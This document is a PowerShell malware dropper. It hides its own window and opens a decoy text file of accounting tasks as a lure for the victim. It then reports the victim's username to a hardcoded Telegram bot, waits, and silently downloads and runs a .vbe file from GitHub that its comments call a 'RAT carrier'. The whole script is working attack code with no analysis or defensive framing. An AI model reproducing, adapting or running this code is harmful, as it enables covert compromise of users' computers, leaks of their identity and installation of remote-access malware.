# HIDE THE POWERSHELL WINDOW
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# CREATE AND RUN LEGIT TXT
$fileName = "Task_for_accountant_of_department_02.txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
Task_for_employee:

Task 1: Transferring data to a table
    Open List_of_materials.txt.
    Create a new file Materials_sorted.xlsx.
    Transfer all data from the text file into a table, creating the columns: Name, Quantity, Unit_of_measure, Cost_per_unit, Supplier.
    Sort the data by the Supplier column in alphabetical order.
    Save the file.

Task 2: Checking and editing the statement
    Open Statement_of_completed_work.xlsx
    Check each entry to ensure it follows the following format:
        The due date must be in the format DD.MM.YYYY.
        Quantity must be a number greater than 0.
    Please correct any errors if you find any.
    Add a new column Notes and for rows where Quantity > 100, write "Large Volume".
    Save the file.

Task 3: Creating a reporting document
    Use the data from Acceptance_acts.txt and Construction_employees.xlsx.
    Create a new file Report_on_acts.docx.
    Create a table with the columns: Act_number, Date, Object, Amount, Status, Responsible_person
    Transfer data from Acts_of_acceptance.txt.
    For each act, in the Responsible Person column, indicate the "responsible person from the file Employees_builders.docx".
    Sort data by Date (newest to oldest).
    Save the file.

Task 4: Summary table by suppliers
    Open the file Materials_sorted.xlsx.
    Create a pivot table on a new sheet.
    In the rows, indicate the Supplier, in the columns - the Name, and in the values ​​- the amount for the column Cost per order × Quantity (total cost).
    Add a filter by the Unit_meas column.
    Save the changes to the same file.

Task 5: Final Report to Management
    Use the files Statement of completed works.xlsx and Report on acts.docx.
    Create a new document Final_report_17.10.2025.docx.
    At the beginning of the document, add a title page with the title: “Final Report on Construction Work” and the date 10/17/2025.
    Insert a table with summary data:
        Total number of completed works.
        Total amount according to acts.
        Number of acts with the status "Not closed".
    At the end of the document, add a "Comments" section where you indicate:
        If there are lines marked "Large Volume", list their numbers.
        If there are acts without a responsible person, indicate their numbers.
    Save the file.

Additional note:
    Save all final files in the Report_on_17.10.2025 folder and send them as a .rar archive.
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# SEND A MESSAGE TO TELEGRAM
$Token = "8619279911:AAHhKbQ6AqO5g3d8mTtEiCbaskTS8BTut5U"
$ChatID = "5811994741"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"

$URL = "https://api.telegram.org/bot$Token/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
} | ConvertTo-Json

try {
    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
} catch {
}

# DELAY
Start-Sleep -Seconds 120

# Hidden download and launch the RAT carrier
$Url = "https://github.com/yourselina/cheva/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
	
}


exit